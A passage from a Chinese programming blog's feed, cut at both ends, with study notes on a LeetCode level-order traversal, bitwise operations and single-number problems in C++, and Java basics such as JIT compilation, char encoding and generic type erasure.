class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode {</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) {}</span></span><br><span class="line"><span class="comment"> * };</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">levelOrder</span>(TreeNode* root) {</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        queue&lt;TreeNode *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())</span><br><span class="line">        {</span><br><span class="line">           <span class="type">int</span> currentLevelSize=q.<span class="built_in">size</span>();</span><br><span class="line">           vector&lt;<span class="type">int</span>&gt; level;</span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;currentLevelSize;i++)</span><br><span class="line">           {</span><br><span class="line">                <span class="keyword">auto</span> cur=q.<span class="built_in">front</span>();</span><br><span class="line">                level.<span class="built_in">push_back</span>(cur-&gt;val);</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;left)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(cur-&gt;right)</span><br><span class="line">                    q.<span class="built_in">push</span>(cur-&gt;right);               </span><br><span class="line">           }</span><br><span class="line">           res.<span class="built_in">push_back</span>(level);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="542-01-矩阵"><a href="#542-01-矩阵" class="headerlink" title="542. 01 矩阵"></a><a href="https://leetcode-cn.com/problems/01-matrix/">542. 01 矩阵</a></h4>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 数据结构 </tag>
        
            
            
        <tag> 栈 </tag>
        
            
            
        <tag> 队列 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>算法与数据结构学习笔记：二进制</title>
      
      
      <link href="/cn/posts/48007/"/>
      
      
      <url>/cn/posts/48007/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="常见二进制操作"><a href="#常见二进制操作" class="headerlink" title="常见二进制操作"></a>常见二进制操作</h1><h2 id="C-位运算符"><a href="#C-位运算符" class="headerlink" title="C++位运算符"></a>C++位运算符</h2><p>下表显示了 C++ 支持的位运算符。</p><p>假设如果 A = 60，且 B = 13，现在以二进制格式表示，它们如下所示：</p><p>A = 0011 1100</p><p>B = 0000 1101</p><p>则：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&amp;</td><td>如果同时存在于两个操作数中，二进制 AND 运算符复制一位到结果中。</td><td>(A &amp; B) 将得到 12，即为 0000 1100</td></tr><tr><td>|</td><td>如果存在于任一操作数中，二进制 OR 运算符复制一位到结果中。</td><td>(A | B) 将得到 61，即为 0011 1101</td></tr><tr><td>^</td><td>如果存在于其中一个操作数中但不同时存在于两个操作数中，二进制异或运算符复制一位到结果中。</td><td>(A ^ B) 将得到 49，即为 0011 0001</td></tr><tr><td>~</td><td>二进制补码运算符是一元运算符，具有”翻转”位效果，即0变成1，1变成0。</td><td>(~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。</td></tr><tr><td>&lt;&lt;</td><td>二进制左移运算符。左操作数的值向左移动右操作数指定的位数。</td><td>A &lt;&lt; 2 将得到 240，即为 1111 0000</td></tr><tr><td>&gt;&gt;</td><td>二进制右移运算符。左操作数的值向右移动右操作数指定的位数。</td><td>A &gt;&gt; 2 将得到 15，即为 0000 1111</td></tr></tbody></table><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>a=0^a=a^0</p><p>0=a^a</p><p>由上面两个推导出：a=a^b^b</p><h2 id="交换两个数"><a href="#交换两个数" class="headerlink" title="交换两个数"></a>交换两个数</h2><p>a=a^b</p><p>b=a^b</p><p>a=a^b</p><h2 id="移除最后一个-1"><a href="#移除最后一个-1" class="headerlink" title="移除最后一个 1"></a>移除最后一个 1</h2><p>a=n&amp;(n-1)</p><h2 id="获取最后一个-1"><a href="#获取最后一个-1" class="headerlink" title="获取最后一个 1"></a>获取最后一个 1</h2><p>diff=(n&amp;(n-1))^n</p><h1 id="常见题目"><a href="#常见题目" class="headerlink" title="常见题目"></a>常见题目</h1><h4 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode-cn.com/problems/single-number/">136. 只出现一次的数字</a></h4><blockquote><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>说明：</p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p>示例 1:</p><p>输入: [2,2,1]<br>输出: 1<br>示例 2:</p><p>输入: [4,1,2,1,2]<br>输出: 4</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/48007/image-20200807111500764.png" alt="image-20200807111500764"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/48007/image-20200807111619453.png" alt="image-20200807111619453"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> num:nums)</span><br><span class="line">        {</span><br><span class="line">            ret^=num;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="137-只出现一次的数字-II"><a href="#137-只出现一次的数字-II" class="headerlink" title="137. 只出现一次的数字 II"></a><a href="https://leetcode-cn.com/problems/single-number-ii/">137. 只出现一次的数字 II</a></h4><blockquote><p>给定一个<strong>非空</strong>整数数组，除了某个元素只出现一次以外，其余每个元素均出现了三次。找出那个只出现了一次的元素。</p><p><strong>说明：</strong></p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><p><strong>示例 1:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [2,2,3,2]</span><br><span class="line">输出: 3</span><br></pre></td></tr></tbody></table></figure><p><strong>示例 2:</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [0,1,0,1,0,1,99]</span><br><span class="line">输出: 99</span><br></pre></td></tr></tbody></table></figure></blockquote><h5 id="遍历统计"><a href="#遍历统计" class="headerlink" title="遍历统计"></a>遍历统计</h5><p>如果所有数字都出现了 3 次，那么每一列的 1 的个数就一定是 3 的倍数。之所以有的列不是 3 的倍数，就是因为只出现了 1 次的数贡献出了 1。所以所有不是 3 的倍数的列写 1，其他列写 0 ，就找到了这个出现 1 次的数。</p><blockquote><p>假如例子是 1 2 6 1 1 2 2 3 3 3, 3 个 1, 3 个 2, 3 个 3,1 个 6<br>1 0 0 1<br>2 0 1 0<br>6 1 1 0<br>1 0 0 1<br>1 0 0 1<br>2 0 1 0<br>2 0 1 0<br>3 0 1 1<br>3 0 1 1<br>3 0 1 1<br>看最右边的一列 1001100111 有 6 个 1<br>再往前看一列 0110011111 有 7 个 1<br>再往前看一列 0010000 有 1 个 1<br>我们只需要把是 3 的倍数的对应列写 0，不是 3 的倍数的对应列写 1<br>也就是 1 1 0,也就是 6。</p></blockquote><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>{</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;nums.<span class="built_in">size</span>();j++)</span><br><span class="line">            {</span><br><span class="line">                sum+=(nums[j]&gt;&gt;i)&amp;<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            ret^=(sum%<span class="number">3</span>)&lt;&lt;i;</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h5 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h5>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> cpp </tag>
        
            
            
        <tag> 算法 </tag>
        
            
            
        <tag> 数据结构 </tag>
        
            
            
        <tag> 二进制 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Java学习笔记-基础篇</title>
      
      
      <link href="/cn/posts/53914/"/>
      
      
      <url>/cn/posts/53914/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="Java程序怎么样运行的"><a href="#Java程序怎么样运行的" class="headerlink" title="Java程序怎么样运行的"></a><strong>Java程序怎么样运行的</strong></h2><p>Java 程序从源代码到运行一般有下面 3 步：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/2020080614124077.png" alt="在这里插入图片描述"><br>我们需要格外注意的是 .class-&gt;机器码 这一步。在这一步 JVM 类加载器首先加载字节码文件，然后通过解释器逐行解释执行，这种方式的执行速度会相对比较慢。而且，有些方法和代码块是经常需要被调用的(也就是所谓的热点代码)，所以后面引进了 JIT 编译器，而 JIT 属于运行时编译。当 JIT 编译器完成第一次编译后，其会将字节码对应的机器码保存下来，下次可以直接使用。而我们知道，机器码的运行效率肯定是高于 Java 解释器的。这也解释了我们为什么经常会说 Java 是编译与解释共存的语言。</p><blockquote><p>HotSpot 采用了惰性评估(Lazy Evaluation)的做法，根据二八定律，消耗大部分系统资源的只有那一小部分的代码（热点代码），而这也就是 JIT 所需要编译的部分。JVM 会根据代码每次被执行的情况收集信息并相应地做出一些优化，因此执行的次数越多，它的速度就越快。JDK 9 引入了一种新的编译模式 AOT(Ahead of Time Compilation)，它是直接将字节码编译成机器码，这样就避免了 JIT 预热等各方面的开销。JDK 支持分层编译和 AOT 协作使用。但是 ，AOT 编译器的编译质量是肯定比不上 JIT 编译器的。</p></blockquote><p>总结：</p><p>Java 虚拟机（JVM）是运行 Java 字节码的虚拟机。JVM 有针对不同系统的特定实现（Windows，Linux，macOS），目的是使用相同的字节码，它们都会给出相同的结果。字节码和不同系统的 JVM 实现是 Java 语言“一次编译，随处可以运行”的关键所在。</p><h2 id="为什么说-Java-语言“编译与解释并存”？"><a href="#为什么说-Java-语言“编译与解释并存”？" class="headerlink" title="为什么说 Java 语言“编译与解释并存”？"></a>为什么说 Java 语言“编译与解释并存”？</h2><p>高级编程语言按照程序的执行方式分为编译型和解释型两种。简单来说，编译型语言是指编译器针对特定的操作系统将源代码一次性翻译成可被该平台执行的机器码；解释型语言是指解释器对源程序逐行解释成特定平台的机器码并立即执行。比如，你想阅读一本英文名著，你可以找一个英文翻译人员帮助你阅读， 有两种选择方式，你可以先等翻译人员将全本的英文名著（也就是源码）都翻译成汉语，再去阅读，也可以让翻译人员翻译一段，你在旁边阅读一段，慢慢把书读完。</p><p>Java 语言既具有编译型语言的特征，也具有解释型语言的特征，因为 Java 程序要经过先编译，后解释两个步骤，由 Java 编写的程序需要先经过编译步骤，生成字节码（*.class 文件），这种字节码必须由 Java 解释器来解释执行。因此，我们可以认为 Java 语言编译与解释并存</p><h2 id="java与C语言在字符串结束符上的区别"><a href="#java与C语言在字符串结束符上的区别" class="headerlink" title="java与C语言在字符串结束符上的区别"></a>java与C语言在字符串结束符上的区别</h2><p>在C语言中字符串或字符数组最后都会有一个额外的字符‘\0’来表示结束，而在java语言中没有结束符这一概念。<br>参考：<a href="https://blog.csdn.net/sszgg2006/article/details/49148189">https://blog.csdn.net/sszgg2006/article/details/49148189</a></p><blockquote><p><strong>java中无需结束符的原因</strong><br>Java里面一切都是对象，是对象的话，字符串肯定就有长度，即然有长度，编译器就可以确定要输出的字符个数，当然也就没有必要去浪费那1字节的空间用以标明字符串的结束了。比如，数组对象里有一个属性length,就是数组的长度，String类里面有方法length()可以确定字符串的长度，因此对于输出函数来说，有直接的大小可以判断字符串的边界，编译器就没必要再去浪费一个空间标识字符串的结束。</p></blockquote><p><strong>java字符串末尾空字符的处理</strong></p><p>java和c通信的时候，由于c中的char中有结束符的，所以当java收到C发来的字符串时，后面往往会有若干空字符，如果不做处理的话，java会对其一并输出，为了将空字符处理掉不输出，可以采用如下两种方法：</p><p>方法一:</p><p>调用java字符串的trim()方法，该方法会将字符串前后的空字符读去掉。</p><p>方法二：自己实现去掉尾部空字符的方法</p><h2 id="字符型常量和字符串常量的区别"><a href="#字符型常量和字符串常量的区别" class="headerlink" title="字符型常量和字符串常量的区别?"></a>字符型常量和字符串常量的区别?</h2><p>形式上: 字符常量是单引号引起的一个字符; 字符串常量是双引号引起的若干个字符<br>含义上: 字符常量相当于一个整型值( ASCII 值),可以参加表达式运算; 字符串常量代表一个地址值(该字符串在内存中存放位置)<br>占内存大小 字符常量只占 2 个字节; 字符串常量占若干个字节 (<strong>注意： char 在 Java 中占两个字节</strong>)</p><blockquote><p>java 编程思想第四版：2.2.2 节<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806142232905.png" alt="在这里插入图片描述"><br>JVM内部使用的是UTF-16编码。不管代码文件中char使用的是什么编码，都将被JVM转化为UTF-16而且只用两个字节，也就是说Java中的char占用两个字节，只能表示Unicode中第一层（BMP）中的字符，对于其他字符会报错：Invalid Character Constant, 而String中是可以的。<br>如果一个抽象的字符在 UTF-16 编码下占 4 字节，显然它是不能放到 char 中的。换言之， char 中只能放 UTF-16 编码下只占 2 字节的那些字符。</p></blockquote><p>String.getBytes()是一个用于将String的内码转换为指定的外码的方法。无参数版使用平台的默认编码作为外码，有参数版使用参数指定的编码作为外码；将String的内容用外码编码好，结果放在一个新byte[]返回。<br>getBytes 实际是做编码转换，你应该显式传入一个参数来指定编码，否则它会使用缺省编码来转换。</p><blockquote><p>“字”在 GBK 编码下占 2 字节，在 UTF-16 编码下也占 2 字节，在 UTF-8 编码下占 3 字节，在 UTF-32 编码下占 4 字</p></blockquote><blockquote><p>“ new String(“字”).getBytes().length 返回的是3 ”，这说明缺省编码是 UTF-8. 如果你显式地传入一个参数，比如这样“ new String(“字”).getBytes(“GBK”).length ”，那么返回就是 2.</p></blockquote><p>你可以在启动 JVM 时设置一个缺省编码，</p><blockquote><p>假设你的类叫 Main，那么在命令行中用 java 执行这个类时可以通过 file.encoding 参数设置一个缺省编码。 比如这样：java -Dfile.encoding=GBK Main 这时，你再执行不带参数的 getBytes() 方法时，new String(“字”).getBytes().length 返回的就是 2 了，因为现在缺省编码变成 GBK 了。 当然，如果这时你显式地指定编码，new String(“字”).getBytes(“UTF-8”).length 返回的则依旧是 3.</p></blockquote><p>否则，会使用所在操作系统环境下的缺省编码。</p><blockquote><p>通常，Windows 系统下是 GBK，Linux 和 Mac 是 UTF-8. 但有一点要注意，在 Windows 下使用 IDE 来运行时，比如 Eclipse，如果你的工程的缺省编码是 UTF-8，在 IDE 中运行你的程序时，会加上上述的 -Dfile.encoding=UTF-8 参数，这时，即便你在 Windows 下，缺省编码也是 UTF-8，而不是 GBK。</p></blockquote><p>总结:char在Java占两字节,大于两字节的不能存.在String里,每个字符大小不同。</p><h2 id="Java中有哪些常见的关键字？"><a href="#Java中有哪些常见的关键字？" class="headerlink" title="Java中有哪些常见的关键字？"></a>Java中有哪些常见的关键字？</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806143410908.png" alt="在这里插入图片描述"></p><h2 id="Java泛型，以及类型擦除，常用的通配符"><a href="#Java泛型，以及类型擦除，常用的通配符" class="headerlink" title="Java泛型，以及类型擦除，常用的通配符"></a>Java泛型，以及类型擦除，常用的通配符</h2><p>Java 泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。</p><h3 id="Java泛型类型擦除以及类型擦除带来的问题"><a href="#Java泛型类型擦除以及类型擦除带来的问题" class="headerlink" title="Java泛型类型擦除以及类型擦除带来的问题"></a>Java泛型类型擦除以及类型擦除带来的问题</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806152854603.png" alt="在这里插入图片描述"></p><p><a href="https://www.cnblogs.com/wuqinglong/p/9456193.html">https://www.cnblogs.com/wuqinglong/p/9456193.html</a><br>大家都知道，Java的泛型是伪泛型，这是因为Java在编译期间，所有的泛型信息都会被擦掉，正确理解泛型概念的首要前提是理解类型擦除。Java的泛型基本上都是在编译器这个层次上实现的，在生成的字节码中是不包含泛型中的类型信息的，使用泛型的时候加上类型参数，在编译器编译的时候会去掉，这个过程成为类型擦除。</p><blockquote><p>原始类型 就是擦除去了泛型信息，最后在字节码中的类型变量的真正类型，无论何时定义一个泛型，相应的原始类型都会被自动提供，类型变量擦除，并使用其限定类型（无限定的变量用Object）替换。</p></blockquote><p>如在代码中定义List<object>和List<string>等类型，在编译后都会变成List，JVM看到的只是List，而由泛型附加的类型信息对JVM是看不到的。Java编译器会在编译时尽可能的发现可能出错的地方，但是仍然无法在运行时刻出现的类型转换异常的情况，类型擦除也是Java的泛型与C++模板机制实现方式之间的重要区别。</string></object></p><blockquote><p>在程序中定义了一个ArrayList泛型类型实例化为Integer对象，如果直接调用add()方法，那么只能存储整数数据，不过当我们利用反射调用add()方法的时候，却可以存储字符串，这说明了Integer泛型实例在编译之后被擦除掉了，只保留了原始类型。</p></blockquote><p>在调用泛型方法时，可以指定泛型，也可以不指定泛型。</p><ul><li>在不指定泛型的情况下，泛型变量的类型为该方法中的几种类型的同一父类的最小级，直到Object</li><li>在指定泛型的情况下，该方法的几种类型必须是该泛型的实例的类型或者其子类</li></ul><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line"></span><br><span class="line">        <span class="comment">/**不指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//这两个参数都是Integer，所以T为Integer类型  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">f</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">1.2</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Number  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="string">"asd"</span>); <span class="comment">//这两个参数一个是Integer，以风格是Float，所以取同一父类的最小级，为Object  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**指定泛型的时候*/</span>  </span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2</span>); <span class="comment">//指定了Integer，所以只能为Integer类型或者其子类  </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//编译错误，指定了Integer，不能为Float  </span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">c</span> <span class="operator">=</span> Test.&lt;Number&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); <span class="comment">//指定为Number，所以可以为Integer和Float  </span></span><br><span class="line">    }  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//这是一个简单的泛型方法  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">add</span><span class="params">(T x,T y)</span>{  </span><br><span class="line">        <span class="keyword">return</span> y;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实在泛型类中，不指定泛型的时候，也差不多，只不过这个时候的泛型为Object，就比如ArrayList中，如果不指定泛型，那么这个ArrayList可以存储任意的对象。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line">    <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br><span class="line">    list.add(<span class="number">1</span>);  </span><br><span class="line">    list.add(<span class="string">"121"</span>);  </span><br><span class="line">    list.add(<span class="keyword">new</span> <span class="title class_">Date</span>());  </span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure><h4 id="类型擦除引起的问题及解决方法"><a href="#类型擦除引起的问题及解决方法" class="headerlink" title="类型擦除引起的问题及解决方法"></a>类型擦除引起的问题及解决方法</h4><h5 id="3-1-先检查，再编译以及编译的对象和引用传递问题"><a href="#3-1-先检查，再编译以及编译的对象和引用传递问题" class="headerlink" title="3-1.先检查，再编译以及编译的对象和引用传递问题"></a>3-1.先检查，再编译以及编译的对象和引用传递问题</h5><p>Q: 既然说类型变量会在编译的时候擦除掉，那为什么我们往 ArrayList 创建的对象中添加整数会报错呢？不是说泛型变量String会在编译的时候变为Object类型吗？为什么不能存别的类型呢？既然类型擦除了，如何保证我们只能使用泛型变量限定的类型呢？</p><p>A: Java编译器是通过先检查代码中泛型的类型，然后在进行类型擦除，再进行编译。</p><p>那么，这个类型检查是针对谁的呢？我们先看看参数化类型和原始类型的兼容。</p><p>以 ArrayList举例子，以前的写法:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br></pre></td></tr></tbody></table></figure><p>现在的写法:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br></pre></td></tr></tbody></table></figure><p>如果是与以前的代码兼容，各种引用传值之间，必然会出现如下的情况：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(); <span class="comment">//第一种 情况</span></span><br><span class="line"><span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">//第二种 情况</span></span><br></pre></td></tr></tbody></table></figure><p>这样是没有错误的，不过会有个编译时警告。</p><p>不过在第一种情况，可以实现与完全使用泛型参数一样的效果，第二种则没有效果。</p><p>因为类型检查就是编译时完成的，new ArrayList()只是在内存中开辟了一个存储空间，可以存储任何类型对象，而真正设计类型检查的是它的引用，因为我们是使用它引用list1来调用它的方法，比如说调用add方法，所以list1引用能完成泛型类型的检查。而引用list2没有使用泛型，所以不行。</p><p>举例子：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {  </span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br><span class="line">        list1.add(<span class="string">"1"</span>); <span class="comment">//编译通过  </span></span><br><span class="line">        list1.add(<span class="number">1</span>); <span class="comment">//编译错误  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> list1.get(<span class="number">0</span>); <span class="comment">//返回类型就是String  </span></span><br><span class="line"></span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();  </span><br><span class="line">        list2.add(<span class="string">"1"</span>); <span class="comment">//编译通过  </span></span><br><span class="line">        list2.add(<span class="number">1</span>); <span class="comment">//编译通过  </span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> list2.get(<span class="number">0</span>); <span class="comment">//返回类型就是Object  </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="string">"11"</span>); <span class="comment">//编译通过  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().add(<span class="number">22</span>); <span class="comment">//编译错误  </span></span><br><span class="line"></span><br><span class="line">        <span 